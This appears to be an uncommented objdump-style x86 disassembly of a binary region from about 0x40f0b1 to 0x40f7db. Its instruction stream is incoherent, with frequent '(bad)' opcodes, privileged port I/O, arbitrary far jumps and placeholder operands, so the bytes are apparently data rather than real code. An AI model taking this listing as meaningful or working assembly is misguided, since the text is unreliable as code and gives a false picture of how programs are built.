  40f0b1:	enter  0x22a1,0x73
  40f0b5:	cmp    eax,0x3b28cce4
  40f0ba:	test   ecx,edi
  40f0bc:	inc    ecx
  40f0bd:	jge    0x40f0c6
  40f0bf:	sar    dh,cl
  40f0c1:	sti    
  40f0c2:	push   edi
  40f0c3:	mov    ds:0xe1ac9a02,al
  40f0c8:	or     bh,BYTE PTR [ebx]
  40f0ca:	cmc    
  40f0cb:	mov    ah,0x1
  40f0cd:	bound  esp,QWORD PTR [ecx+0x3e]
  40f0d0:	mov    edx,esp
  40f0d2:	xor    eax,0x2ec27b0c
  40f0d7:	push   es
  40f0d8:	pop    ds
  40f0d9:	and    BYTE PTR [esi-0x63],cl
  40f0dc:	mov    eax,0xbabf488
  40f0e1:	outs   dx,DWORD PTR ds:[esi]
  40f0e2:	push   esp
  40f0e3:	dec    ebx
  40f0e4:	(bad)  
  40f0e5:	mov    al,ds:0x46ae8b0c
  40f0ea:	cdq    
  40f0eb:	jno    0x40f135
  40f0ed:	pop    edi
  40f0ee:	ret    0x7bf5
  40f0f1:	dec    ebp
  40f0f2:	fwait
  40f0f3:	and    al,0xf
  40f0f5:	add    BYTE PTR [ecx+0x5e7ef59e],dl
  40f0fb:	or     al,0x5a
  40f0fd:	cdq    
  40f0fe:	das    
  40f0ff:	inc    ecx
  40f100:	inc    esi
  40f101:	jge    0x40f161
  40f103:	stos   DWORD PTR es:[edi],eax
  40f104:	sub    eax,0x4fd49021
  40f109:	jns    0x40f12c
  40f10b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f10c:	push   ecx
  40f10d:	xchg   esi,eax
  40f10e:	(bad)  
  40f10f:	cld    
  40f110:	pusha  
  40f111:	mov    DWORD PTR [eax+esi*4-0x4af172cd],edi
  40f118:	cs cwde 
  40f11a:	call   0xf53e:0xe81ec83b
  40f121:	lds    esi,FWORD PTR [edx-0x61]
  40f124:	out    0xb6,eax
  40f126:	mov    ds:0x45a3c313,eax
  40f12b:	rcr    ebx,cl
  40f12d:	cld    
  40f12e:	jle    0x40f11e
  40f130:	mov    DWORD PTR [ecx-0x1],eax
  40f133:	inc    ecx
  40f134:	xchg   esi,eax
  40f135:	push   ebx
  40f136:	cdq    
  40f137:	rcr    BYTE PTR [edx-0x704b20ed],1
  40f13d:	out    dx,eax
  40f13e:	in     eax,dx
  40f13f:	jns    0x40f180
  40f141:	xor    eax,0xca6dcb8f
  40f146:	call   0x4648:0x87b333e4
  40f14d:	pop    eax
  40f14e:	sub    BYTE PTR [eax+0x220743a7],bh
  40f154:	mov    WORD PTR [edx-0x14],?
  40f157:	leave  
  40f158:	dec    edi
  40f159:	aaa    
  40f15a:	push   es
  40f15b:	aam    0x5b
  40f15d:	inc    ebp
  40f15e:	int    0xe1
  40f160:	fcmovnu st,st(2)
  40f162:	adc    DWORD PTR [esi-0x34],0x8
  40f166:	sahf   
  40f167:	push   0xfffffffc
  40f169:	mov    bl,BYTE PTR [eax]
  40f16b:	mov    DWORD PTR [ebx+0x596b84d5],ebp
  40f171:	pop    eax
  40f172:	loopne 0x40f1ec
  40f174:	ficomp DWORD PTR [eax]
  40f176:	(bad)  
  40f178:	in     eax,0xb6
  40f17a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f17b:	mov    es,WORD PTR [ebp+ebp*1+0xcd8db9d]
  40f182:	cs es mov ebp,0x95b4709e
  40f189:	repz cmp al,0xbe
  40f18c:	push   ds
  40f18d:	mov    edi,0x78e296fa
  40f192:	rcr    dh,1
  40f194:	dec    ecx
  40f195:	add    dh,0x32
  40f198:	push   edx
  40f199:	pop    ebx
  40f19a:	xchg   ebx,eax
  40f19b:	cmp    dh,ch
  40f19d:	cli    
  40f19e:	jecxz  0x40f146
  40f1a0:	add    eax,0xe116b8e4
  40f1a5:	jbe    0x40f165
  40f1a7:	and    dl,BYTE PTR [ebx-0x701087fc]
  40f1ad:	adc    esi,DWORD PTR [edx-0xd5f1174]
  40f1b3:	les    edx,FWORD PTR [esi-0x60]
  40f1b6:	arpl   si,si
  40f1b8:	push   ebx
  40f1b9:	mov    eax,ds:0x79916c20
  40f1be:	into   
  40f1bf:	jmp    0xc1e4:0xc62da812
  40f1c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f1c7:	inc    esi
  40f1c8:	cli    
  40f1c9:	dec    edi
  40f1ca:	daa    
  40f1cb:	jge    0x40f14e
  40f1cd:	jmp    0xa6d1dfdb
  40f1d2:	outs   dx,BYTE PTR ds:[esi]
  40f1d3:	dec    esi
  40f1d4:	sbb    BYTE PTR [eax],dh
  40f1d6:	mov    ch,0x38
  40f1d8:	inc    eax
  40f1d9:	mov    cl,0xfb
  40f1db:	and    eax,0xe581088
  40f1e0:	lods   eax,DWORD PTR ds:[esi]
  40f1e1:	push   ebp
  40f1e2:	imul   edx,eax,0x7d
  40f1e5:	aad    0xd8
  40f1e7:	(bad)  
  40f1e8:	push   ebp
  40f1e9:	xor    esp,DWORD PTR [eax-0x69]
  40f1ec:	jp     0x40f251
  40f1ee:	outs   dx,DWORD PTR ds:[esi]
  40f1ef:	stos   DWORD PTR es:[edi],eax
  40f1f0:	inc    BYTE PTR [ecx-0x543f0a59]
  40f1f6:	xlat   BYTE PTR ds:[ebx]
  40f1f7:	xchg   DWORD PTR [ebx-0xae707b6],edx
  40f1fd:	fmulp  st(7),st
  40f1ff:	cdq    
  40f200:	pop    edx
  40f201:	inc    edx
  40f202:	dec    esp
  40f203:	push   ds
  40f204:	enter  0x1669,0x6b
  40f208:	pushw  cs
  40f20a:	pushf  
  40f20b:	in     eax,dx
  40f20c:	adc    dh,BYTE PTR [eax]
  40f20e:	loopne 0x40f215
  40f210:	push   esp
  40f211:	mov    al,BYTE PTR [ecx-0x11079b9d]
  40f217:	pop    ecx
  40f218:	jp     0x40f228
  40f21a:	cmp    edx,DWORD PTR [ebx+eiz*8+0xd6de243]
  40f221:	push   edx
  40f222:	sub    ah,al
  40f224:	xchg   edx,eax
  40f225:	stc    
  40f226:	pop    ebp
  40f227:	xor    dh,BYTE PTR [eax-0x1c]
  40f22a:	or     ah,0x14
  40f22d:	xchg   edx,eax
  40f22e:	dec    esp
  40f22f:	inc    ebx
  40f230:	sub    DWORD PTR ds:0x77fc34ce,edx
  40f236:	hlt    
  40f237:	test   BYTE PTR [esi],dl
  40f239:	jecxz  0x40f23d
  40f23b:	and    DWORD PTR [edi],edx
  40f23d:	out    0x79,al
  40f23f:	mov    esi,0xb728cdd3
  40f244:	add    eax,DWORD PTR [esi*2+0x4d5fd2f8]
  40f24b:	(bad)  
  40f24c:	adc    eax,0x86c5e1
  40f251:	inc    ebp
  40f252:	cdq    
  40f253:	dec    ebp
  40f254:	mov    ah,0x96
  40f256:	add    bh,ch
  40f258:	pop    ss
  40f259:	mov    cl,0x4d
  40f25b:	clc    
  40f25c:	push   ds
  40f25d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f25e:	ins    DWORD PTR es:[edi],dx
  40f25f:	adc    BYTE PTR [eax+0x50],al
  40f262:	shl    eax,1
  40f264:	ret    0x6d55
  40f267:	out    0x11,eax
  40f269:	jo     0x40f291
  40f26b:	and    eax,0x798e74e7
  40f270:	fidiv  DWORD PTR [ecx-0x1ee33ee6]
  40f276:	dec    esi
  40f277:	push   edi
  40f278:	xchg   DWORD PTR [eax],edx
  40f27a:	sub    BYTE PTR [esp+ebp*4],dl
  40f27d:	dec    ebx
  40f27e:	sbb    DWORD PTR [ebx+0x130be2a0],eax
  40f284:	pop    edx
  40f285:	add    bl,BYTE PTR [eax]
  40f287:	jno    0x40f214
  40f289:	mov    dl,0xed
  40f28b:	popf   
  40f28c:	mov    eax,es
  40f28e:	mov    al,0x72
  40f290:	lea    esi,[eax-0x3a125397]
  40f296:	lahf   
  40f297:	pop    ss
  40f298:	push   ss
  40f299:	dec    esi
  40f29a:	stos   DWORD PTR es:[edi],eax
  40f29b:	jae    0x40f259
  40f29d:	xchg   esp,eax
  40f29e:	xor    ch,bh
  40f2a0:	fcom   DWORD PTR [eax]
  40f2a2:	clc    
  40f2a3:	add    DWORD PTR [edx-0x70],edx
  40f2a6:	test   cl,0xb4
  40f2a9:	push   ds
  40f2aa:	or     eax,0x772a116
  40f2af:	dec    ecx
  40f2b0:	sub    al,0x52
  40f2b2:	hlt    
  40f2b3:	into   
  40f2b4:	mov    DWORD PTR [edx],edi
  40f2b6:	push   ecx
  40f2b7:	int    0xed
  40f2b9:	pop    ds
  40f2ba:	sbb    DWORD PTR [edi-0x45ff661b],esi
  40f2c0:	scas   al,BYTE PTR es:[edi]
  40f2c1:	cmp    eax,0x562ddf83
  40f2c6:	add    DWORD PTR [esi+edx*8],esp
  40f2c9:	jecxz  0x40f33e
  40f2cb:	sahf   
  40f2cc:	sub    bl,BYTE PTR [edi]
  40f2ce:	push   cs
  40f2cf:	sbb    BYTE PTR [edi],cl
  40f2d1:	sbb    bh,BYTE PTR [esi-0x55]
  40f2d4:	xchg   ecx,eax
  40f2d5:	mov    ?,WORD PTR ds:[edx]
  40f2d8:	mov    cl,0x56
  40f2da:	sbb    eax,ebp
  40f2dc:	xchg   edi,eax
  40f2dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f2de:	sub    al,0x4d
  40f2e0:	and    cl,BYTE PTR [eax-0x9]
  40f2e3:	add    eax,0x21889a30
  40f2e8:	hlt    
  40f2e9:	push   esp
  40f2ea:	inc    ebp
  40f2eb:	and    al,BYTE PTR [esi+ebx*1+0x64]
  40f2ef:	stc    
  40f2f0:	ret    0x433a
  40f2f3:	or     DWORD PTR [ecx],0xe020a83b
  40f2f9:	fild   DWORD PTR [esi-0x2e612ba]
  40f2ff:	adc    al,0xf0
  40f301:	cmp    BYTE PTR [eax+0x4cbd2e67],dh
  40f307:	or     al,0x6d
  40f309:	push   edx
  40f30a:	cwde   
  40f30b:	mov    ebp,0x8f15333e
  40f310:	pop    ecx
  40f311:	cmp    eax,0xc1405ee9
  40f316:	fcomp  QWORD PTR [edx+edx*1+0x193a5716]
  40f31d:	int3   
  40f31e:	fwait
  40f31f:	loope  0x40f30b
  40f321:	add    al,0x22
  40f323:	pop    ecx
  40f324:	xchg   DWORD PTR [ecx-0x74d9d3df],ecx
  40f32a:	loopne 0x40f2f6
  40f32c:	js     0x40f2ed
  40f32e:	out    dx,al
  40f32f:	in     al,0x3b
  40f331:	int3   
  40f332:	xchg   BYTE PTR [ecx+0x2672bc82],ch
  40f338:	dec    edx
  40f339:	iret   
  40f33a:	and    ch,BYTE PTR [eax-0x6cdc670a]
  40f340:	add    DWORD PTR [edx+0x293ca9de],edx
  40f346:	sub    DWORD PTR ds:0xb32ca192,edx
  40f34c:	shl    DWORD PTR [ebx-0x5b],cl
  40f34f:	nop
  40f350:	mov    cl,0x98
  40f352:	cmp    BYTE PTR [edi-0x3b],dl
  40f355:	enter  0x46c3,0x4f
  40f359:	aad    0x65
  40f35b:	ins    BYTE PTR es:[edi],dx
  40f35c:	push   0x2d
  40f35e:	push   esp
  40f35f:	mov    bl,0x59
  40f361:	stos   BYTE PTR es:[edi],al
  40f362:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f363:	adc    ah,BYTE PTR [ecx+0x390231ff]
  40f369:	jo     0x40f2fb
  40f36b:	lods   al,BYTE PTR ds:[esi]
  40f36c:	cmp    eax,0x4323658
  40f371:	out    0x80,al
  40f373:	fcmovbe st,st(2)
  40f375:	inc    ecx
  40f376:	cmc    
  40f377:	fs rol bl,1
  40f37a:	dec    edi
  40f37b:	xor    DWORD PTR [edx-0x4b],edx
  40f37e:	aam    0x26
  40f380:	push   0xffffff88
  40f382:	std    
  40f383:	movaps XMMWORD PTR [edx+0x3b],xmm1
  40f387:	ror    DWORD PTR [esi-0x5a],0xea
  40f38b:	pop    eax
  40f38c:	iret   
  40f38d:	xchg   edi,eax
  40f38e:	(bad)  
  40f38f:	pop    eax
  40f390:	xor    BYTE PTR [ecx+eiz*1],0x1
  40f394:	inc    esi
  40f395:	in     al,dx
  40f396:	lds    esi,FWORD PTR [ebp+0x6df48cdf]
  40f39c:	retf   
  40f39d:	pop    ss
  40f39e:	cmp    esi,DWORD PTR [ecx-0x3e2ea02]
  40f3a4:	inc    ebp
  40f3a5:	add    eax,DWORD PTR [ecx]
  40f3a7:	push   ecx
  40f3a8:	arpl   WORD PTR [ebx-0x22],sp
  40f3ab:	lock jg 0x40f426
  40f3ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f3af:	dec    ecx
  40f3b0:	mov    ecx,0x14e08ae
  40f3b5:	fisttp QWORD PTR [eax-0x76]
  40f3b8:	inc    esp
  40f3b9:	jge    0x40f40c
  40f3bb:	pop    esi
  40f3bc:	std    
  40f3bd:	int3   
  40f3be:	daa    
  40f3bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f3c0:	cmp    ecx,esi
  40f3c2:	test   DWORD PTR cs:[ebx-0x78],edx
  40f3c6:	or     ah,bl
  40f3c8:	mov    ds:0x394e35b,al
  40f3cd:	xlat   BYTE PTR ds:[ebx]
  40f3ce:	push   ss
  40f3cf:	cmp    BYTE PTR ds:0xb0846950,dl
  40f3d5:	in     eax,0x47
  40f3d7:	jmp    0x550a:0xb6511132
  40f3de:	sub    DWORD PTR [esp+eiz*4+0x72],ebx
  40f3e2:	leave  
  40f3e3:	sbb    eax,DWORD PTR [ebx]
  40f3e5:	(bad)  
  40f3e6:	in     al,dx
  40f3e7:	in     eax,0xc2
  40f3e9:	gs test eax,0xf836bb25
  40f3ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f3f0:	adc    ebx,esp
  40f3f2:	pop    esp
  40f3f3:	adc    al,0xe9
  40f3f5:	sbb    al,0x7d
  40f3f7:	enter  0x2938,0xee
  40f3fb:	out    0x54,eax
  40f3fd:	xor    al,0xe3
  40f3ff:	sbb    bl,BYTE PTR [ebx]
  40f401:	xlat   BYTE PTR ds:[ebx]
  40f402:	sub    bh,dh
  40f404:	clc    
  40f405:	xor    eax,0x7beb9315
  40f40a:	psubusw mm1,QWORD PTR [ecx+0x53]
  40f40e:	test   eax,0x10646887
  40f413:	(bad)  
  40f414:	push   cs
  40f415:	shl    DWORD PTR [ebx+0x50],1
  40f418:	and    DWORD PTR [edi-0x36],ecx
  40f41b:	cli    
  40f41c:	outs   dx,BYTE PTR ds:[esi]
  40f41d:	mov    ebp,0x5ab52256
  40f422:	push   edx
  40f423:	and    eax,0x6bbf0128
  40f428:	jecxz  0x40f432
  40f42a:	xchg   edi,edx
  40f42c:	int    0x82
  40f42e:	pop    ebp
  40f42f:	dec    eax
  40f430:	es cs out 0x1b,eax
  40f434:	mov    bl,BYTE PTR [ebp+0x1c909105]
  40f43a:	test   BYTE PTR [esi-0x7e],bl
  40f43d:	jle    0x40f4b7
  40f43f:	mov    esp,0x40ad885c
  40f444:	sub    dh,BYTE PTR [ebp+0x1b690b31]
  40f44a:	aas    
  40f44b:	cmp    al,0xb0
  40f44d:	pop    ds
  40f44e:	leave  
  40f44f:	pusha  
  40f450:	inc    edi
  40f451:	push   es
  40f452:	pop    es
  40f453:	pop    ss
  40f454:	mov    bh,0x98
  40f456:	jae    0x40f475
  40f458:	loope  0x40f4b3
  40f45a:	pushf  
  40f45b:	cmp    BYTE PTR [esi-0x76],ch
  40f45e:	mov    ds:0x5f0473ad,eax
  40f463:	mov    esp,es
  40f465:	push   ebp
  40f466:	aam    0x79
  40f468:	fucomi st,st(2)
  40f46a:	push   edi
  40f46b:	in     eax,0x6
  40f46d:	lock out 0x7,al
  40f470:	rol    BYTE PTR [edx-0x18],0xf7
  40f474:	sbb    BYTE PTR [eax-0x31],al
  40f477:	out    dx,al
  40f478:	and    ah,bh
  40f47a:	std    
  40f47b:	adc    al,0xa9
  40f47d:	sbb    eax,0xb575e42b
  40f482:	push   esi
  40f483:	fdivr  st,st(0)
  40f485:	inc    esp
  40f486:	aas    
  40f487:	hlt    
  40f488:	inc    edi
  40f489:	push   ebp
  40f48a:	dec    ecx
  40f48b:	jbe    0x40f4e9
  40f48d:	jg     0x40f50c
  40f48f:	cs (bad) 
  40f491:	popf   
  40f492:	daa    
  40f493:	jge    0x40f4aa
  40f495:	lods   al,BYTE PTR ds:[esi]
  40f496:	and    ch,ch
  40f498:	adc    eax,ebx
  40f49a:	xor    bl,BYTE PTR [esp+eax*4]
  40f49d:	std    
  40f49e:	sub    bl,ah
  40f4a0:	add    eax,0xa91dfe3
  40f4a5:	nop
  40f4a6:	std    
  40f4a7:	sub    al,0x8b
  40f4a9:	enter  0xe27f,0xd9
  40f4ad:	push   cs
  40f4ae:	aad    0xec
  40f4b0:	mov    al,0x31
  40f4b2:	fisub  DWORD PTR [ebx]
  40f4b4:	int    0x58
  40f4b6:	jb     0x40f4a3
  40f4b8:	xchg   edi,eax
  40f4b9:	and    esp,DWORD PTR [edx-0x626535b0]
  40f4bf:	xchg   ecx,eax
  40f4c0:	jb     0x40f495
  40f4c2:	mov    ah,0x57
  40f4c4:	mov    dh,BYTE PTR [edx+0x4219e9b5]
  40f4ca:	mov    esp,0x29df5c22
  40f4cf:	mov    bl,BYTE PTR ds:0x60f4e8bc
  40f4d5:	in     eax,0xba
  40f4d7:	xlat   BYTE PTR ds:[ebx]
  40f4d8:	js     0x40f4c5
  40f4da:	sub    bl,dl
  40f4dc:	pop    ebx
  40f4dd:	je     0x40f4b8
  40f4df:	and    ebp,edi
  40f4e1:	popa   
  40f4e2:	cmp    cl,BYTE PTR [eax+0x3a]
  40f4e5:	xlat   BYTE PTR ds:[ebx]
  40f4e6:	cmp    cl,BYTE PTR [ebx-0x6ea9d2f]
  40f4ec:	fld    TBYTE PTR [ebx]
  40f4ee:	push   ss
  40f4ef:	ins    BYTE PTR es:[edi],dx
  40f4f0:	test   al,0xad
  40f4f2:	(bad)  
  40f4f3:	xchg   edx,eax
  40f4f4:	mov    ah,0x42
  40f4f6:	imul   ebp,ecx,0xffffffb8
  40f4f9:	inc    edx
  40f4fa:	jg     0x40f4ed
  40f4fc:	lds    ebp,FWORD PTR [ebx]
  40f4fe:	dec    esp
  40f4ff:	not    ebp
  40f501:	pop    eax
  40f502:	(bad)  
  40f503:	mov    edx,0xaa56bfcd
  40f508:	xor    ah,BYTE PTR [eax-0x47ffb7f8]
  40f50e:	add    al,0xc7
  40f510:	call   0xf4e524c6
  40f515:	ins    BYTE PTR es:[edi],dx
  40f516:	push   ecx
  40f517:	jecxz  0x40f4be
  40f519:	stos   BYTE PTR es:[edi],al
  40f51a:	mov    ebx,0xf100ec2d
  40f51f:	pop    es
  40f520:	mov    ecx,gs
  40f522:	idiv   BYTE PTR [esi]
  40f524:	rcr    BYTE PTR [ebp+ecx*1+0x7c],0xd2
  40f529:	mov    edi,0x2c8a311f
  40f52e:	fiadd  WORD PTR [esi-0x2f2c8a4b]
  40f534:	sbb    DWORD PTR [eax+edx*8-0x5a],ebx
  40f538:	xchg   ebp,eax
  40f539:	int3   
  40f53a:	rcl    BYTE PTR [esi+edx*2-0x6a5d2a50],1
  40f541:	pop    es
  40f542:	stc    
  40f543:	and    BYTE PTR [eax+0x10],bh
  40f546:	jp     0x40f55f
  40f548:	cld    
  40f549:	jge    0x40f567
  40f54b:	jnp    0x40f59f
  40f54d:	out    dx,al
  40f54e:	mov    dl,0x9d
  40f550:	mov    ds:0xde963160,eax
  40f555:	out    0xef,eax
  40f557:	ds xor al,0x11
  40f55a:	push   0x5
  40f55c:	mov    al,ds:0x634c92f4
  40f561:	or     dh,BYTE PTR [edi]
  40f563:	(bad)  
  40f564:	adc    al,cl
  40f566:	adc    eax,0xe6c12bc0
  40f56b:	jge    0x40f5d3
  40f56d:	xchg   ebx,eax
  40f56e:	test   BYTE PTR [esi+0x247faf58],cl
  40f574:	aam    0x18
  40f576:	stc    
  40f577:	test   DWORD PTR [edx],0x63059aa3
  40f57d:	cmp    edi,DWORD PTR [ebx+ecx*1]
  40f580:	iret   
  40f581:	pop    ds
  40f582:	jmp    0xb3a5e9c2
  40f587:	xchg   DWORD PTR ss:[eax],esi
  40f58a:	dec    edx
  40f58b:	cmp    al,0x71
  40f58d:	and    al,0x2c
  40f58f:	daa    
  40f590:	push   ds
  40f591:	jmp    0xc86d:0x7cd3fe4d
  40f598:	cmp    eax,0xa8405090
  40f59d:	sahf   
  40f59e:	push   ds
  40f59f:	dec    esp
  40f5a0:	lahf   
  40f5a1:	test   BYTE PTR [esi-0x310f31c9],bh
  40f5a7:	sbb    edi,DWORD PTR [ebp-0x1]
  40f5aa:	ret    
  40f5ab:	mov    ?,esi
  40f5ad:	(bad)  
  40f5ae:	push   edi
  40f5af:	xchg   esp,eax
  40f5b0:	mov    DWORD PTR [ebx+0xf],esi
  40f5b3:	iret   
  40f5b4:	jg     0x40f601
  40f5b6:	loop   0x40f55a
  40f5b8:	pop    ebp
  40f5b9:	inc    ebp
  40f5ba:	sbb    DWORD PTR [esi],0x21
  40f5bd:	jle    0x40f5ba
  40f5bf:	mov    DWORD PTR [ebp-0x3c],ecx
  40f5c2:	jno    0x40f610
  40f5c4:	mov    ?,WORD PTR [ecx+0x64af286e]
  40f5ca:	xchg   edx,eax
  40f5cb:	mov    ah,bl
  40f5cd:	pop    ecx
  40f5ce:	lea    ecx,[eax+eiz*4-0x6d907da3]
  40f5d5:	xor    BYTE PTR [ebx+0x1a48b40f],bh
  40f5db:	fcmovbe st,st(4)
  40f5dd:	mov    ch,0xad
  40f5df:	loopne 0x40f5a7
  40f5e1:	jae    0x40f63b
  40f5e3:	mov    esi,0x49875450
  40f5e8:	pop    ds
  40f5e9:	mov    ah,0xc0
  40f5eb:	dec    esp
  40f5ec:	out    0x9e,eax
  40f5ee:	scas   eax,DWORD PTR es:[edi]
  40f5ef:	adc    ecx,DWORD PTR [ecx-0x1b]
  40f5f2:	out    0xa2,eax
  40f5f4:	jp     0x40f62b
  40f5f6:	out    0xd,al
  40f5f8:	xor    ebx,eax
  40f5fa:	pop    edx
  40f5fb:	int3   
  40f5fc:	sahf   
  40f5fd:	jae    0x40f5dd
  40f5ff:	test   DWORD PTR ss:[eax],ebx
  40f602:	ins    BYTE PTR es:[edi],dx
  40f603:	dec    ebx
  40f604:	mov    ds:0xc3b28d79,eax
  40f609:	cmp    bl,BYTE PTR ds:0xa63142ba
  40f60f:	pusha  
  40f610:	retf   
  40f611:	pop    ebp
  40f612:	nop
  40f613:	jb     0x40f5fe
  40f615:	jge    0x40f682
  40f617:	imul   ebx,DWORD PTR [edi-0x22],0x1fc44666
  40f61e:	xlat   BYTE PTR ds:[ebx]
  40f61f:	(bad)  [esi+0x214932a2]
  40f625:	pop    ebp
  40f626:	fst    DWORD PTR [ebx+0x2]
  40f629:	sti    
  40f62a:	fcmovb st,st(6)
  40f62c:	xchg   BYTE PTR [edx],ah
  40f62e:	sbb    edi,edx
  40f630:	adc    DWORD PTR [edx-0x6d9f7830],edi
  40f636:	fwait
  40f637:	(bad)  
  40f638:	hlt    
  40f639:	outs   dx,BYTE PTR ds:[esi]
  40f63a:	jbe    0x40f5e0
  40f63c:	dec    ecx
  40f63d:	ins    DWORD PTR es:[edi],dx
  40f63e:	adc    esp,DWORD PTR [edi+0x4c]
  40f641:	xchg   edi,eax
  40f642:	mov    dh,0x7b
  40f644:	std    
  40f645:	leave  
  40f646:	jnp    0x40f6c3
  40f648:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f649:	xor    DWORD PTR [edx],esp
  40f64b:	mov    edi,0x7d54ce0c
  40f650:	xor    al,BYTE PTR [ecx+0x54]
  40f653:	push   edx
  40f654:	les    ebp,FWORD PTR [ebx-0x629f3ef]
  40f65a:	in     eax,0xa4
  40f65c:	jecxz  0x40f695
  40f65e:	lahf   
  40f65f:	pop    ebx
  40f660:	xchg   BYTE PTR [eax-0x4d],bl
  40f663:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f664:	xchg   ch,ah
  40f666:	leavew 
  40f668:	xor    al,0x4
  40f66a:	sbb    DWORD PTR [edx+0x4e72b075],ebx
  40f670:	gs out 0x75,al
  40f673:	jge    0x40f667
  40f675:	cs dec ebp
  40f677:	cmp    bh,ch
  40f679:	xor    BYTE PTR [ecx+ecx*4],dh
  40f67c:	fidivr DWORD PTR [edx+0x3a]
  40f67f:	pusha  
  40f680:	loopne 0x40f6f8
  40f682:	fs jns 0x40f661
  40f685:	push   cs
  40f686:	or     eax,0x32a42872
  40f68b:	and    DWORD PTR [ecx-0x5],ebx
  40f68e:	jmp    0x6aa70234
  40f693:	outs   dx,BYTE PTR ds:[esi]
  40f694:	ret    
  40f695:	pop    es
  40f696:	leave  
  40f697:	mov    ss,eax
  40f699:	std    
  40f69a:	mov    al,cs:0x523becad
  40f6a0:	lds    ebx,FWORD PTR [esi-0x7a]
  40f6a3:	or     BYTE PTR [edx+0x4d],0x84
  40f6a7:	sub    DWORD PTR [bp+di-0x2246],0x74
  40f6ad:	in     eax,0x7c
  40f6af:	(bad)  
  40f6b0:	jns    0x40f6de
  40f6b2:	mov    ah,0x6d
  40f6b4:	pusha  
  40f6b5:	sub    BYTE PTR [esi-0x446517fb],0x44
  40f6bc:	pop    edi
  40f6bd:	out    dx,eax
  40f6be:	cs enter 0x330b,0x8d
  40f6c3:	jb     0x40f650
  40f6c5:	jl     0x40f6b3
  40f6c7:	adc    eax,0xff4f3801
  40f6cc:	inc    eax
  40f6cd:	push   cs
  40f6ce:	mov    ss,WORD PTR [ebp-0x5ee90719]
  40f6d4:	and    eax,0x5976809d
  40f6d9:	mov    ds:0xfee3c325,al
  40f6de:	gs aas 
  40f6e0:	sbb    ebx,DWORD PTR [edx]
  40f6e2:	mov    cl,0x7f
  40f6e4:	xor    ebp,DWORD PTR [esi-0x47]
  40f6e7:	cmp    bl,BYTE PTR [edx+0x34]
  40f6ea:	lahf   
  40f6eb:	scas   eax,DWORD PTR es:[edi]
  40f6ec:	scas   eax,DWORD PTR es:[edi]
  40f6ed:	mov    edi,0xda3865a1
  40f6f2:	dec    ebp
  40f6f3:	or     eax,0x8add7275
  40f6f8:	repz es in eax,0x85
  40f6fc:	mov    edi,0xd4bd1c46
  40f701:	test   BYTE PTR [ecx-0x64aace34],cl
  40f707:	cmp    eax,0x2fd0146d
  40f70c:	sbb    esi,DWORD PTR [eax]
  40f70e:	fdivr  QWORD PTR [esi]
  40f710:	aam    0xcd
  40f712:	arpl   WORD PTR ds:0xf987ca06,sp
  40f718:	fcomp  DWORD PTR [ecx+0x33d569a7]
  40f71e:	or     ah,BYTE PTR [ecx-0x7c]
  40f721:	(bad)  [esi+eiz*4+0xa]
  40f725:	mov    WORD PTR [ebx+0x51],ds
  40f728:	cmp    al,0x76
  40f72a:	ror    DWORD PTR [edx+ebp*8-0x1d5bae0b],cl
  40f731:	shr    DWORD PTR ds:0x2696dc8,0xcb
  40f738:	inc    edx
  40f739:	sbb    esi,ebx
  40f73b:	mov    ds:0x13c0eb3d,al
  40f740:	pop    ebp
  40f741:	adc    eax,0x726c113a
  40f746:	in     al,0xea
  40f748:	jno    0x40f728
  40f74a:	jne    0x40f73d
  40f74c:	mov    dh,0x75
  40f74e:	inc    eax
  40f74f:	add    DWORD PTR [eax],ebx
  40f751:	inc    ecx
  40f752:	sub    dh,ah
  40f754:	div    dh
  40f756:	inc    esp
  40f757:	retf   0xbee1
  40f75a:	sub    esi,DWORD PTR [edx]
  40f75c:	or     dh,0xa5
  40f75f:	jno    0x40f734
  40f761:	dec    edi
  40f762:	nop
  40f763:	cmp    BYTE PTR [edx],dh
  40f765:	inc    eax
  40f766:	xchg   edx,eax
  40f767:	jnp    0x40f777
  40f769:	sub    edx,DWORD PTR [ebp+0x61]
  40f76c:	push   ecx
  40f76d:	call   DWORD PTR [ecx]
  40f76f:	or     dh,BYTE PTR [eax]
  40f771:	mov    esi,0x85cc8a40
  40f776:	push   esp
  40f777:	stos   BYTE PTR es:[edi],al
  40f778:	and    eax,DWORD PTR [esi+0x4b5cb812]
  40f77e:	xor    eax,0x3c
  40f781:	jne    0x40f703
  40f783:	mov    eax,0xf1392d86
  40f788:	mov    esi,0x1ab1ee9e
  40f78d:	int    0x31
  40f78f:	pop    esi
  40f790:	leave  
  40f791:	xchg   edi,eax
  40f792:	bound  edi,QWORD PTR [ebx]
  40f794:	pop    edx
  40f795:	pop    es
  40f796:	jns    0x40f720
  40f798:	or     ecx,edi
  40f79a:	int    0xb3
  40f79c:	mov    esp,0x259aa561
  40f7a1:	cli    
  40f7a2:	fucomi st,st(0)
  40f7a4:	mov    ah,0x66
  40f7a6:	fistp  DWORD PTR [eax+0x43024d0e]
  40f7ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f7ad:	fs aad 0x4a
  40f7b0:	out    dx,eax
  40f7b1:	(bad)  
  40f7b2:	mov    ecx,0xbab5e4ec
  40f7b8:	or     dl,cl
  40f7ba:	fcmovne st,st(3)
  40f7bc:	and    BYTE PTR [ecx+0x8f89de6],bh
  40f7c2:	jno    0x40f7ca
  40f7c4:	aaa    
  40f7c5:	xchg   edx,eax
  40f7c6:	iret   
  40f7c7:	inc    eax
  40f7c8:	xchg   edx,eax
  40f7c9:	dec    ecx
  40f7ca:	out    dx,eax
  40f7cb:	lods   eax,DWORD PTR ds:[esi]
  40f7cc:	ja     0x40f750
  40f7ce:	jg     0x40f825
  40f7d0:	outs   dx,DWORD PTR ds:[esi]
  40f7d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f7d2:	adc    eax,0x9b5f099d
  40f7d7:	dec    ebx
  40f7d8:	jbe    0x40f7f7
  40f7da:	ret    
  40f7db:	and    al,0x4b
